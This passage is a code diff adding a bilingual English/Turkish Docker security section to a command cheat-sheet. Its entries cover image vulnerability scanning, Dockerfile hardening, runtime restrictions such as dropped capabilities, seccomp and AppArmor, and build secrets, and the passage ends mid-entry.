@@ -26235,5 +26235,2230 @@ module.exports = [
         ]
       }
     ]
+  },
+  {
+    "id": "docker-security",
+    "name": "Docker Security",
+    "name_tr": "Docker Güvenliği",
+    "icon": "🛡️",
+    "description": "Securing Docker: image scanning, Dockerfile hardening, runtime security, secrets, rootless mode, CIS benchmark, and container escape testing.",
+    "description_tr": "Docker'ı güvenli hale getirme: imaj tarama, Dockerfile sıkılaştırma, çalışma zamanı güvenliği, gizli bilgiler, rootless mod, CIS benchmark ve konteyner kaçış testleri.",
+    "subcategories": [
+      {
+        "name": "Image Scanning (Trivy, Grype, Docker Scout, Dockle)",
+        "commands": [
+          {
+            "title": "Trivy Image Scan",
+            "desc": "Scan a container image for vulnerabilities",
+            "desc_tr": "Bir konteyner imajını zafiyetler için tarar",
+            "cmd": "trivy image <IMAGE>:<TAG>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Scan Only High/Critical",
+            "desc": "Report only HIGH and CRITICAL severity findings",
+            "desc_tr": "Sadece HIGH ve CRITICAL seviyesindeki bulguları raporlar",
+            "cmd": "trivy image --severity HIGH,CRITICAL <IMAGE>:<TAG>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Fail Build on Vulns",
+            "desc": "Exit non-zero in CI when fixable CRITICAL vulns are found",
+            "desc_tr": "CI'da düzeltilebilir CRITICAL zafiyet bulununca sıfırdan farklı çıkış kodu döner",
+            "cmd": "trivy image --exit-code 1 --severity CRITICAL --ignore-unfixed <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "--ignore-unfixed gürültüyü azaltır; sadece yaması olan zafiyetlerde pipeline'ı kırar."
+          },
+          {
+            "title": "Trivy JSON Report Output",
+            "desc": "Output scan results as JSON for parsing",
+            "desc_tr": "Tarama sonuçlarını işlenebilir JSON olarak çıkartır",
+            "cmd": "trivy image --format json --output <FILE>.json <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy SARIF for GitHub",
+            "desc": "Generate SARIF report for GitHub code scanning",
+            "desc_tr": "GitHub code scanning için SARIF raporu üretir",
+            "cmd": "trivy image --format sarif --output trivy-results.sarif <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Scan with Secrets",
+            "desc": "Scan image for vulns, misconfigs and exposed secrets",
+            "desc_tr": "İmajı zafiyet, yanlış yapılandırma ve sızdırılmış gizli bilgiler için tarar",
+            "cmd": "trivy image --scanners vuln,misconfig,secret <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy SBOM Generation",
+            "desc": "Generate a CycloneDX SBOM from an image",
+            "desc_tr": "İmajdan CycloneDX formatında SBOM (yazılım malzeme listesi) üretir",
+            "cmd": "trivy image --format cyclonedx --output <FILE>.cdx.json <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Scan Local Tar Image",
+            "desc": "Scan an image saved as a tarball without a registry",
+            "desc_tr": "Registry kullanmadan tarball olarak kaydedilmiş bir imajı tarar",
+            "cmd": "trivy image --input <FILE>.tar",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy with Ignore File",
+            "desc": "Suppress accepted CVEs listed in .trivyignore",
+            "desc_tr": ".trivyignore içinde listelenen kabul edilmiş CVE'leri bastırır",
+            "cmd": "trivy image --ignorefile <PATH>/.trivyignore <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Offline / Air-Gapped Scan",
+            "desc": "Scan without downloading the vulnerability DB at runtime",
+            "desc_tr": "Çalışma anında zafiyet veritabanı indirmeden (hava boşluklu ortam) tarar",
+            "cmd": "trivy image --skip-db-update --offline-scan <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "note": "Önceden 'trivy image --download-db-only' ile DB'yi indirip cache'leyin."
+          },
+          {
+            "title": "Trivy Update Vulnerability DB",
+            "desc": "Pre-download only the vulnerability database",
+            "desc_tr": "Yalnızca zafiyet veritabanını önceden indirir",
+            "cmd": "trivy image --download-db-only",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Image Scan",
+            "desc": "Scan an image for vulnerabilities with Grype",
+            "desc_tr": "Grype ile bir imajı zafiyetler için tarar",
+            "cmd": "grype <IMAGE>:<TAG>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Fail Above Severity",
+            "desc": "Fail CI if any finding meets or exceeds high severity",
+            "desc_tr": "Bulgular high seviyesine ulaşırsa CI'ı başarısız yapar",
+            "cmd": "grype <IMAGE>:<TAG> --fail-on high",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Only Fixed Vulns",
+            "desc": "Show only vulnerabilities that have an available fix",
+            "desc_tr": "Sadece yaması mevcut olan zafiyetleri gösterir",
+            "cmd": "grype <IMAGE>:<TAG> --only-fixed",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype JSON Output",
+            "desc": "Output Grype results in JSON format",
+            "desc_tr": "Grype sonuçlarını JSON formatında çıktılar",
+            "cmd": "grype <IMAGE>:<TAG> -o json > <FILE>.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Scan from SBOM",
+            "desc": "Scan an existing Syft SBOM instead of the live image",
+            "desc_tr": "Canlı imaj yerine mevcut bir Syft SBOM dosyasını tarar",
+            "cmd": "grype sbom:<FILE>.json",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Syft Generate SBOM",
+            "desc": "Create an SBOM of an image to feed scanners",
+            "desc_tr": "Tarayıcılara beslemek için imajın SBOM'unu oluşturur",
+            "cmd": "syft <IMAGE>:<TAG> -o spdx-json=<FILE>.json",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Grype Update DB",
+            "desc": "Refresh the Grype vulnerability database",
+            "desc_tr": "Grype zafiyet veritabanını günceller",
+            "cmd": "grype db update",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Docker Scout Quickview",
+            "desc": "High-level vulnerability overview of an image",
+            "desc_tr": "Bir imajın üst düzey zafiyet özetini gösterir",
+            "cmd": "docker scout quickview <IMAGE>:<TAG>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Docker Scout CVE Details",
+            "desc": "List detailed CVEs filtered by severity",
+            "desc_tr": "Önem derecesine göre filtrelenmiş ayrıntılı CVE'leri listeler",
+            "cmd": "docker scout cves --only-severity critical,high <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Docker Scout Compare Images",
+            "desc": "Diff vulnerabilities between two image versions",
+            "desc_tr": "İki imaj sürümü arasındaki zafiyet farkını karşılaştırır",
+            "cmd": "docker scout compare --to <REGISTRY>/<IMAGE>:latest <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Docker Scout Base Image Fix",
+            "desc": "Recommend a more secure or updated base image",
+            "desc_tr": "Daha güvenli veya güncel bir temel imaj önerir",
+            "cmd": "docker scout recommendations <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Docker Scout Policy Evaluation",
+            "desc": "Evaluate an image against organization policies",
+            "desc_tr": "Bir imajı kurum politikalarına göre değerlendirir",
+            "cmd": "docker scout policy <IMAGE>:<TAG> --org <NAMESPACE>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Dockle Image Lint",
+            "desc": "Lint image for CIS Docker Benchmark best practices",
+            "desc_tr": "İmajı CIS Docker Benchmark en iyi uygulamaları için denetler",
+            "cmd": "dockle <IMAGE>:<TAG>",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Dockle Fail on FATAL",
+            "desc": "Set exit code to fail CI on FATAL-level findings",
+            "desc_tr": "FATAL seviyesindeki bulgularda CI'ı kırmak için çıkış kodu ayarlar",
+            "cmd": "dockle --exit-code 1 --exit-level fatal <IMAGE>:<TAG>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Dockle JSON Report",
+            "desc": "Output Dockle lint results as JSON",
+            "desc_tr": "Dockle denetim sonuçlarını JSON olarak çıktılar",
+            "cmd": "dockle -f json -o <FILE>.json <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Dockle Ignore Specific Checks",
+            "desc": "Skip selected Dockle check codes",
+            "desc_tr": "Seçili Dockle kontrol kodlarını atlar",
+            "cmd": "dockle --accept-key <KEY> -i CIS-DI-0001 <IMAGE>:<TAG>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trivy Repo / IaC Config Scan",
+            "desc": "Scan Dockerfiles and IaC for misconfigurations",
+            "desc_tr": "Dockerfile ve IaC dosyalarını yanlış yapılandırmalar için tarar",
+            "cmd": "trivy config <PATH>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Dockerfile Hardening & Best Practices",
+        "commands": [
+          {
+            "title": "Run as Non-Root User",
+            "desc": "Create and switch to an unprivileged user in the Dockerfile",
+            "desc_tr": "Dockerfile icinde ayricaliksiz bir kullanici olusturup ona gec",
+            "cmd": "RUN addgroup -S app && adduser -S -G app app\nUSER app",
+            "tags": [
+              "essential"
+            ],
+            "note": "Avoid running as UID 0; many CVEs are only exploitable as root inside the container."
+          },
+          {
+            "title": "Pin Base Image by Digest",
+            "desc": "Pin the base image to an immutable SHA256 digest instead of a mutable tag",
+            "desc_tr": "Base image'i degisken bir etiket yerine sabit SHA256 digest'e sabitle",
+            "cmd": "FROM alpine:3.20@sha256:<DIGEST>",
+            "tags": [
+              "essential"
+            ],
+            "note": "Digest pinning prevents supply-chain drift; tags like 'latest' can change under you."
+          },
+          {
+            "title": "Multi-Stage Build to Drop Build Tools",
+            "desc": "Use a builder stage so compilers and secrets never reach the final image",
+            "desc_tr": "Builder asamasi kullan; derleyiciler ve secret'lar final image'e gecmesin",
+            "cmd": "FROM golang:1.22 AS build\nWORKDIR /src\nCOPY . .\nRUN CGO_ENABLED=0 go build -o /app .\nFROM gcr.io/distroless/static:nonroot\nCOPY --from=build /app /app\nUSER nonroot\nENTRYPOINT [\"/app\"]",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Distroless / Scratch Final Image",
+            "desc": "Ship on a minimal distroless or scratch base to shrink attack surface",
+            "desc_tr": "Saldiri yuzeyini kucultmek icin minimal distroless veya scratch base ile dagit",
+            "cmd": "FROM gcr.io/distroless/base-debian12:nonroot",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Drop SUID/SGID Bits",
+            "desc": "Strip setuid/setgid binaries to block privilege escalation",
+            "desc_tr": "Yetki yukseltmeyi engellemek icin setuid/setgid binary'leri temizle",
+            "cmd": "RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} + || true",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Mount Secrets Without Baking Them In",
+            "desc": "Use BuildKit secret mounts so credentials never persist in a layer",
+            "desc_tr": "Kimlik bilgileri bir katmanda kalmasin diye BuildKit secret mount kullan",
+            "cmd": "RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Build with: DOCKER_BUILDKIT=1 docker build --secret id=npmrc,src=<FILE> ."
+          },
+          {
+            "title": "Use COPY Instead of ADD",
+            "desc": "Prefer COPY; ADD auto-extracts archives and fetches URLs, widening risk",
+            "desc_tr": "COPY tercih et; ADD arsivleri otomatik acar ve URL ceker, riski artirir",
+            "cmd": "COPY --chown=app:app <FILE> /app/",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pin Package Versions",
+            "desc": "Pin exact package versions for reproducible, auditable builds",
+            "desc_tr": "Tekrarlanabilir ve denetlenebilir build'ler icin paket versiyonlarini sabitle",
+            "cmd": "RUN apk add --no-cache curl=8.9.1-r1",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Clean apt Cache in Same Layer",
+            "desc": "Remove package lists in the same RUN to avoid leaking them into a layer",
+            "desc_tr": "Paket listelerini ayni RUN icinde sil ki katmana sizmasinlar",
+            "cmd": "RUN apt-get update && apt-get install -y --no-install-recommends <PKG> && rm -rf /var/lib/apt/lists/*",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Pre-create Writable Dirs for Read-Only Rootfs",
+            "desc": "Pre-create writable dirs so the container can run with a read-only rootfs",
+            "desc_tr": "Container read-only rootfs ile calisabilsin diye yazilabilir dizinleri onceden olustur",
+            "cmd": "RUN mkdir -p /tmp /run && chown app:app /tmp /run",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Pair with `docker run --read-only --tmpfs /tmp` at runtime."
+          },
+          {
+            "title": "Add HEALTHCHECK",
+            "desc": "Define a HEALTHCHECK so orchestrators detect compromised/hung containers",
+            "desc_tr": "Orkestratorler ele gecirilmis/takilmis container'lari fark etsin diye HEALTHCHECK tanimla",
+            "cmd": "HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD wget -qO- http://localhost:8080/health || exit 1",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Use Exec-Form ENTRYPOINT",
+            "desc": "Use JSON exec form so the process is PID 1 and receives signals correctly",
+            "desc_tr": "Surec PID 1 olsun ve sinyalleri dogru alsin diye JSON exec formunu kullan",
+            "cmd": "ENTRYPOINT [\"/app\"]",
+            "tags": [
+              "essential"
+            ],
+            "note": "Shell form (ENTRYPOINT app) forks a shell as PID 1 and breaks SIGTERM handling."
+          },
+          {
+            "title": "Lint Dockerfile with Hadolint",
+            "desc": "Statically lint the Dockerfile for security and best-practice violations",
+            "desc_tr": "Guvenlik ve en iyi pratik ihlalleri icin Dockerfile'i statik olarak lint et",
+            "cmd": "docker run --rm -i hadolint/hadolint < Dockerfile",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Scan Image for CVEs with Trivy",
+            "desc": "Scan the built image for known vulnerabilities and fail on high severity",
+            "desc_tr": "Olusturulan image'i bilinen zafiyetler icin tara ve yuksek seviyede basarisiz ol",
+            "cmd": "trivy image --severity HIGH,CRITICAL --exit-code 1 <IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Scan Image with Grype",
+            "desc": "Use Grype as an alternative SBOM-based vulnerability scanner",
+            "desc_tr": "Alternatif SBOM tabanli zafiyet tarayicisi olarak Grype kullan",
+            "cmd": "grype <IMAGE> --fail-on high",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Generate SBOM with Syft",
+            "desc": "Produce a software bill of materials for provenance and audits",
+            "desc_tr": "Kanit ve denetimler icin yazilim malzeme listesi (SBOM) uret",
+            "cmd": "syft <IMAGE> -o spdx-json=sbom.spdx.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Add .dockerignore",
+            "desc": "Exclude secrets, .git and local artifacts from the build context",
+            "desc_tr": "Secret'lari, .git'i ve yerel artefaktlari build context'inden disla",
+            "cmd": "printf '.git\\n.env\\n*.pem\\nnode_modules\\nDockerfile\\n' > .dockerignore",
+            "tags": [
+              "essential"
+            ],
+            "note": "A leaked .git or .env in the context can end up copied into the image."
+          },
+          {
+            "title": "Use Specific WORKDIR Not Root",
+            "desc": "Set a dedicated WORKDIR instead of building/running from /",
+            "desc_tr": "/ dizininden build/run yapmak yerine ozel bir WORKDIR ayarla",
+            "cmd": "WORKDIR /app",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Drop Capabilities at Runtime",
+            "desc": "Run the hardened image with all Linux capabilities dropped",
+            "desc_tr": "Sertlestirilmis image'i tum Linux capability'leri dusurulmus halde calistir",
+            "cmd": "docker run --cap-drop=ALL --security-opt no-new-privileges <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Verify Image Signature with Cosign",
+            "desc": "Verify the image is signed before deploying it",
+            "desc_tr": "Dagitmadan once image'in imzali oldugunu dogrula",
+            "cmd": "cosign verify --key cosign.pub <REGISTRY>/<IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Sign Image with Cosign",
+            "desc": "Cryptographically sign the image for supply-chain integrity",
+            "desc_tr": "Tedarik zinciri butunlugu icin image'i kriptografik olarak imzala",
+            "cmd": "cosign sign --key cosign.key <REGISTRY>/<IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Inspect Image Layers/History",
+            "desc": "Audit image history to spot secrets or risky commands baked into layers",
+            "desc_tr": "Katmanlara islenmis secret'lari veya riskli komutlari yakalamak icin image gecmisini denetle",
+            "cmd": "docker history --no-trunc <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Deep-Dive Layers with Dive",
+            "desc": "Analyze layer efficiency and wasted/secret-bearing files interactively",
+            "desc_tr": "Katman verimliligini ve israf/secret iceren dosyalari etkilesimli analiz et",
+            "cmd": "dive <IMAGE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Set Numeric USER for runAsNonRoot",
+            "desc": "Use a numeric UID so Kubernetes runAsNonRoot can enforce it",
+            "desc_tr": "Kubernetes runAsNonRoot zorlayabilsin diye sayisal UID kullan",
+            "cmd": "USER 10001:10001",
+            "tags": [
+              "advanced"
+            ],
+            "note": "runAsNonRoot can only validate numeric UIDs, not usernames."
+          },
+          {
+            "title": "Scan for Hardcoded Secrets",
+            "desc": "Scan the image for hardcoded secrets in ENV/ARG and files",
+            "desc_tr": "Image'i ENV/ARG ve dosyalardaki sabit kodlanmis secret'lar icin tara",
+            "cmd": "trivy image --scanners secret <IMAGE>",
+            "tags": [
+              "tool"
+            ],
+            "note": "ARG and ENV values are visible via `docker history` and image inspect."
+          },
+          {
+            "title": "Use Init for Zombie Reaping",
+            "desc": "Run with an init process to reap zombies and forward signals",
+            "desc_tr": "Zombi surecleri toplamak ve sinyalleri iletmek icin bir init sureci ile calistir",
+            "cmd": "docker run --init <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Disable Privilege Escalation at Runtime",
+            "desc": "Set no-new-privileges so processes cannot gain extra privileges via setuid",
+            "desc_tr": "Surecler setuid ile ekstra yetki alamasin diye no-new-privileges ayarla",
+            "cmd": "docker run --security-opt=no-new-privileges:true <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Runtime Hardening (capabilities, seccomp, AppArmor, read-only, no-new-privileges)",
+        "commands": [
+          {
+            "title": "Drop All Capabilities",
+            "desc": "Start a container with no Linux capabilities for least privilege",
+            "desc_tr": "Konteyneri hicbir Linux capability olmadan baslatir, en az ayricalik prensibi icin",
+            "cmd": "docker run --cap-drop=ALL <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Drop All Then Add Only Needed",
+            "desc": "Drop everything then re-add only the single capability the app requires",
+            "desc_tr": "Once tum capability'leri dusurur, sonra yalnizca uygulamanin ihtiyac duydugu tek capability'i geri ekler",
+            "cmd": "docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE <IMAGE>",
+            "tags": [
+              "essential"
+            ],
+            "note": "NET_BIND_SERVICE lets a non-root process bind ports below 1024."
+          },
+          {
+            "title": "Drop a Specific Capability",
+            "desc": "Remove NET_RAW to block raw socket / ARP spoofing abuse",
+            "desc_tr": "Ham soket / ARP spoofing istismarini engellemek icin NET_RAW capability'sini kaldirir",
+            "cmd": "docker run --cap-drop=NET_RAW <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "List Container Capabilities",
+            "desc": "Inspect effective capabilities inside a running container",
+            "desc_tr": "Calisan konteyner icindeki etkin (effective) capability'leri inceler",
+            "cmd": "docker run --rm -it <IMAGE> sh -c 'apk add -q libcap 2>/dev/null; capsh --print'",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Inspect CapAdd / CapDrop Config",
+            "desc": "Read the capability add/drop settings applied to a container",
+            "desc_tr": "Bir konteynere uygulanan capability ekleme/dusurme ayarlarini okur",
+            "cmd": "docker inspect --format '{{json .HostConfig.CapAdd}} {{json .HostConfig.CapDrop}}' <CONTAINER>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Enforce no-new-privileges",
+            "desc": "Prevent processes from gaining new privileges via setuid/setgid binaries",
+            "desc_tr": "Processlerin setuid/setgid ikili dosyalari ile yeni ayricalik kazanmasini engeller",
+            "cmd": "docker run --security-opt no-new-privileges <IMAGE>",
+            "tags": [
+              "essential"
+            ],
+            "note": "Blocks privilege escalation even if a setuid binary like sudo exists in the image."
+          },
+          {
+            "title": "Read-Only Root Filesystem",
+            "desc": "Mount the container root filesystem as read-only to stop tampering",
+            "desc_tr": "Konteyner kok dosya sistemini salt-okunur baglar, dosya kurcalamalarini durdurur",
+            "cmd": "docker run --read-only <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Read-Only Root with Writable tmpfs",
+            "desc": "Read-only root while allowing a small non-exec tmpfs for /tmp writes",
+            "desc_tr": "Kok dosya sistemi salt-okunur kalirken /tmp yazimlari icin kucuk, calistirilamaz bir tmpfs saglar",
+            "cmd": "docker run --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m <IMAGE>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "noexec + nosuid prevent running or escalating from files dropped in /tmp."
+          },
+          {
+            "title": "Apply Custom Seccomp Profile",
+            "desc": "Restrict allowed syscalls using a custom seccomp BPF profile",
+            "desc_tr": "Ozel bir seccomp BPF profili kullanarak izin verilen sistem cagrilarini kisitlar",
+            "cmd": "docker run --security-opt seccomp=/path/to/seccomp.json <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Export Docker Default Seccomp Profile",
+            "desc": "Download the upstream Docker default seccomp profile as a baseline to customize",
+            "desc_tr": "Ozellestirmek icin temel olarak Docker varsayilan seccomp profilini upstream'den indirir",
+            "cmd": "curl -fsSL https://raw.githubusercontent.com/moby/moby/master/profiles/seccomp/default.json -o default-seccomp.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Verify Seccomp Is Active",
+            "desc": "Confirm Seccomp mode (2 = filtering enabled) inside the container",
+            "desc_tr": "Konteyner icinde Seccomp modunu dogrular (2 = filtreleme etkin)",
+            "cmd": "docker run --rm <IMAGE> grep -i seccomp /proc/self/status",
+            "tags": [
+              "essential"
+            ],
+            "note": "Seccomp: 2 means a filter is loaded; 0 means unconfined."
+          },
+          {
+            "title": "Disable Seccomp (Diagnostic Only)",
+            "desc": "Turn off seccomp filtering, only for debugging which syscall is blocked",
+            "desc_tr": "Seccomp filtrelemesini kapatir, yalnizca hangi syscall'in engellendigini hata ayiklamak icin",
+            "cmd": "docker run --security-opt seccomp=unconfined <IMAGE>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Never run unconfined in production; use it only to identify a needed syscall."
+          },
+          {
+            "title": "Apply an AppArmor Profile",
+            "desc": "Confine the container with a named AppArmor profile",
+            "desc_tr": "Konteyneri adlandirilmis bir AppArmor profili ile sinirlandirir",
+            "cmd": "docker run --security-opt apparmor=<PROFILE> <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Load a Custom AppArmor Profile",
+            "desc": "Parse/load a profile into the kernel then run a container under it",
+            "desc_tr": "Bir profili kernel'e yukler, ardindan konteyneri bu profil altinda calistirir",
+            "cmds": [
+              "sudo apparmor_parser -r -W <FILE>",
+              "docker run --security-opt apparmor=<PROFILE> <IMAGE>"
+            ],
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Check Loaded AppArmor Profiles",
+            "desc": "List AppArmor profiles currently loaded and in enforce mode",
+            "desc_tr": "Su anda yuklu ve enforce modunda olan AppArmor profillerini listeler",
+            "cmd": "sudo aa-status",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Run with docker-default AppArmor",
+            "desc": "Explicitly apply Docker's built-in default AppArmor profile",
+            "desc_tr": "Docker'in dahili varsayilan AppArmor profilini acikca uygular",
+            "cmd": "docker run --security-opt apparmor=docker-default <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Run as Non-Root User",
+            "desc": "Force the container to run as an unprivileged UID/GID instead of root",
+            "desc_tr": "Konteyneri root yerine ayricaliksiz bir UID/GID ile calismaya zorlar",
+            "cmd": "docker run --user 1000:1000 <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Combine Core Hardening Flags",
+            "desc": "Layered baseline: no caps, no priv escalation, read-only, non-root",
+            "desc_tr": "Katmanli temel: capability yok, ayricalik yukseltme yok, salt-okunur, root-disi",
+            "cmd": "docker run --cap-drop=ALL --security-opt no-new-privileges --read-only --user 1000:1000 <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Enable User Namespace Remapping",
+            "desc": "Map container root to an unprivileged host UID via userns remapping",
+            "desc_tr": "userns remapping ile konteyner root'unu ayricaliksiz bir host UID'sine eslestirir",
+            "cmd": "docker run --userns-remap=default <IMAGE>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Daemon-wide userns-remap is set in /etc/docker/daemon.json; this isolates in-container root from host root."
+          },
+          {
+            "title": "Limit PIDs to Prevent Fork Bombs",
+            "desc": "Cap the number of processes a container may spawn",
+            "desc_tr": "Bir konteynerin olusturabilecegi process sayisini sinirlar, fork bomba saldirilarini engeller",
+            "cmd": "docker run --pids-limit=100 <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Remove SETUID/SETGID Capabilities",
+            "desc": "Remove SETUID/SETGID so the process cannot change its UID/GID",
+            "desc_tr": "SETUID/SETGID capability'lerini kaldirir, boylece process kendi UID/GID'sini degistiremez",
+            "cmd": "docker run --cap-drop=SETUID --cap-drop=SETGID <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Audit Privileged & Capability Settings",
+            "desc": "Quickly confirm whether a container is privileged and which security-opts apply",
+            "desc_tr": "Bir konteynerin privileged olup olmadigini ve hangi security-opt'larin uygulandigini hizlica dogrular",
+            "cmd": "docker inspect --format '{{.HostConfig.Privileged}} {{.HostConfig.SecurityOpt}}' <CONTAINER>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Compose: Runtime Hardening Block",
+            "desc": "Declare capabilities, read-only, and no-new-privileges in Compose",
+            "desc_tr": "Capability'leri, salt-okunur ve no-new-privileges ayarlarini Compose icinde tanimlar",
+            "cmds": [
+              "# docker-compose.yml service block:",
+              "#   read_only: true",
+              "#   cap_drop: [ALL]",
+              "#   security_opt: [\"no-new-privileges:true\"]",
+              "#   tmpfs: [\"/tmp:noexec,nosuid,size=64m\"]",
+              "docker compose -f <FILE> up -d"
+            ],
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Scan Container for Hardening Gaps",
+            "desc": "Run CIS Docker Bench to audit runtime and host hardening posture",
+            "desc_tr": "Calisma zamani ve host sertlestirme durumunu denetlemek icin CIS Docker Bench calistirir",
+            "cmd": "docker run --rm --net host --pid host --userns host --cap-add audit_control -v /var/run/docker.sock:/var/run/docker.sock:ro -v /etc:/etc:ro docker/docker-bench-security",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Trace Blocked Syscalls with Strace",
+            "desc": "Identify which syscalls a seccomp profile is blocking (EPERM hits)",
+            "desc_tr": "Bir seccomp profilinin hangi sistem cagrilarini engelledigini (EPERM) tespit eder",
+            "cmd": "docker run --rm --cap-add=SYS_PTRACE <IMAGE> strace -f -e trace=all <PATH>",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Look for syscalls returning EPERM to know what to whitelist in your seccomp profile."
+          },
+          {
+            "title": "Restrict Bind Mount to Read-Only",
+            "desc": "Bind-mount host paths read-only so the container cannot modify them",
+            "desc_tr": "Host yollarini salt-okunur olarak baglar, boylece konteyner bunlari degistiremez",
+            "cmd": "docker run -v <PATH>:/data:ro <IMAGE>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Disable Privileged Mode Explicitly",
+            "desc": "Ensure privileged is off and capabilities are stripped together",
+            "desc_tr": "Privileged modun kapali oldugundan ve capability'lerin birlikte temizlendiginden emin olur",
+            "cmd": "docker run --privileged=false --cap-drop=ALL --security-opt no-new-privileges <IMAGE>",
+            "tags": [
+              "advanced"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Secrets in Docker (build secrets, BuildKit, anti-patterns)",
+        "commands": [
+          {
+            "title": "Enable BuildKit for the current build",
+            "desc": "Turn on BuildKit so --secret and --mount=type=secret are supported.",
+            "desc_tr": "BuildKit'i etkinlestirir, boylece --secret ve --mount=type=secret desteklenir.",
+            "cmd": "DOCKER_BUILDKIT=1 docker build -t <IMAGE> .",
+            "tags": [
+              "essential"
+            ],
+            "note": "Modern Docker Engine ile buildx varsayilan; eski surumlerde bu degisken sart."
+          },
+          {
+            "title": "Enable BuildKit globally in the daemon",
+            "desc": "Persist BuildKit as the default builder via daemon.json.",
+            "desc_tr": "daemon.json ile BuildKit'i kalici varsayilan derleyici yapar.",
